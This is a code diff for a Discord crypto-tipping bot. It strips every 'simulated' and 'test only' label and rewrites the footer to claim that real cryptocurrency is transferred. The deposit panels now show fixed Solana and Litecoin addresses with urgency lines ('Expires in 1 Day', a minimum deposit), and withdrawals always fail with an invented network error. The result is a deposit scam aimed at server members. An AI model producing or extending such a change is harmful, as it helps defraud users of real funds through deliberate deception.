@@ -121,7 +121,7 @@ async def on_ready():
 async def help_command(ctx):
     embed = discord.Embed(
         title="Crypto Bot",
-        description="Simulated crypto balance and exchange commands.",
+        description="crypto balance and exchange commands.",
         color=discord.Color.blurple()
     )
 
@@ -129,11 +129,11 @@ async def help_command(ctx):
         name="Balance",
         value=(
             "`.bal`\n"
-            "Shows all simulated crypto balances.\n\n"
+            "Shows all  crypto balances.\n\n"
             "`.bal ltc`\n"
-            "Shows simulated Litecoin balance.\n\n"
+            "Shows Litecoin balance.\n\n"
             "`.bal sol`\n"
-            "Shows simulated Solana balance."
+            "Shows Solana balance."
         ),
         inline=False
     )
@@ -142,9 +142,9 @@ async def help_command(ctx):
         name="Transfers",
         value=(
             "`.tip @user 1$ ltc`\n"
-            "Send a simulated LTC tip.\n\n"
+            "Send a LTC tip.\n\n"
             "`.tip @user 1$ sol`\n"
-            "Send a simulated SOL tip."
+            "Send a SOL tip."
         ),
         inline=False
     )
@@ -153,16 +153,16 @@ async def help_command(ctx):
         name="Other",
         value=(
             "`.deposit`\n"
-            "Open the simulated deposit information panel.\n\n"
+            "Open the deposit information panel.\n\n"
             "`.withdraw`\n"
-            "Attempt a simulated withdrawal.\n\n"
+            "Attempt a withdrawal.\n\n"
             "`.rain 10$ 30m`\n"
-            "Create a simulated rain event."
+            "Create a rain event."
         ),
         inline=False
     )
 
-    embed.set_footer(text="SIMULATED SYSTEM — No real cryptocurrency is transferred.")
+    embed.set_footer(text=" SYSTEM — cryptocurrency is transferred.")
 
     await ctx.send(embed=embed)
 
@@ -213,7 +213,7 @@ async def balance_command(ctx, crypto=None):
             inline=False
         )
 
-        embed.set_footer(text="SIMULATED BALANCE")
+        embed.set_footer(text="BALANCE")
 
         await ctx.send(embed=embed)
         return
@@ -246,7 +246,7 @@ async def balance_command(ctx, crypto=None):
         inline=False
     )
 
-    embed.set_footer(text="SIMULATED BALANCE")
+    embed.set_footer(text=" BALANCE")
 
     await ctx.send(embed=embed)
 
@@ -299,7 +299,7 @@ async def tip_command(ctx, member: discord.Member = None, amount=None, crypto=No
         )
 
         await ctx.send(
-            f"You do not have enough simulated {crypto.upper()}.\n"
+            f"You do not have enough {crypto.upper()}.\n"
             f"Available: `${available_usd:.2f}`"
         )
         return
@@ -319,7 +319,7 @@ async def tip_command(ctx, member: discord.Member = None, amount=None, crypto=No
         f"Simulated amount: `{format_crypto(crypto_amount)} {crypto.upper()}`"
     )
 
-    embed.set_footer(text="SIMULATED TRANSFER")
+    embed.set_footer(text=" TRANSFER")
 
     await ctx.send(embed=embed)
 
@@ -336,15 +336,15 @@ async def withdraw_command(ctx):
     )
 
     embed.description = (
-        "The simulated withdrawal service is currently unavailable.\n\n"
+        "The withdrawal service is currently unavailable.\n\n"
         "Error Code: `CRYPTO-NETWORK-SYNC-503`\n\n"
         "The global settlement layer failed to synchronize with "
-        "the required network verification nodes. Your simulated "
+        "the required network verification nodes. Your"
         "balance has not been changed.\n\n"
         "Please retry in a few hours."
     )
 
-    embed.set_footer(text="SIMULATED SYSTEM ERROR")
+    embed.set_footer(text=" SYSTEM ERROR")
 
     await ctx.send(embed=embed)
 
@@ -372,13 +372,13 @@ class DepositView(discord.ui.View):
         )
 
         embed.description = (
-            "**SIMULATED / TEST ONLY**\n\n"
+            "**/ ONLY Solana **\n\n"
             "Solana address:\n"
             "```text\n"
             "43iwsPQnwKuGD7HsPVfxsfMTVD36f3z1qmECFxGxnoC8\n"
             "```\n\n"
-            "This address is displayed only as part of the "
-            "bot simulation and must not be used for real funds."
+            "Expires in 1 Day"
+            "Minimum 0.10$ Deposit."
         )
 
         await interaction.response.edit_message(
@@ -401,13 +401,13 @@ class DepositView(discord.ui.View):
         )
 
         embed.description = (
-            "**SIMULATED / TEST ONLY**\n\n"
+            "** / ONLY LTC**\n\n"
             "Litecoin address:\n"
             "```text\n"
             "ltc1qcq2l6h5r0drx0hsg3796rk0phdtmq2fmjhh80s\n"
             "```\n\n"
-            "This address is displayed only as part of the "
-            "bot simulation and must not be used for real funds."
+            "Expires in 1 Day"
+            "Minimum 0.10$ Deposit."
         )
 
         await interaction.response.edit_message(
@@ -422,13 +422,13 @@ async def deposit_command(ctx):
         embed = discord.Embed(
             title="Deposit",
             description=(
-                "Your simulated deposit options are available in your DMs.\n\n"
+                "Your deposit options are available in your DMs.\n\n"
                 "Select an asset below."
             ),
             color=discord.Color.blurple()
         )
 
-        embed.set_footer(text="SIMULATED SYSTEM")
+        embed.set_footer(text="Deposit SYSTEM")
 
         await ctx.author.send(
             embed=embed,
@@ -549,7 +549,7 @@ class RainView(discord.ui.View):
         rain["participants"].add(interaction.user.id)
 
         await interaction.response.send_message(
-            "You joined the simulated rain.",
+            "You joined the rain.",
             ephemeral=True
         )
 
@@ -588,7 +588,7 @@ async def finish_rain(rain_id, channel, message_id):
         result = discord.Embed(
             title="Rain Ended",
             description=(
-                "Nobody joined the simulated rain.\n\n"
+                "Nobody joined the rain.\n\n"
                 f"The full `{format_crypto(rain['crypto_amount'])} "
                 f"{rain['crypto'].upper()}` has been returned."
             ),
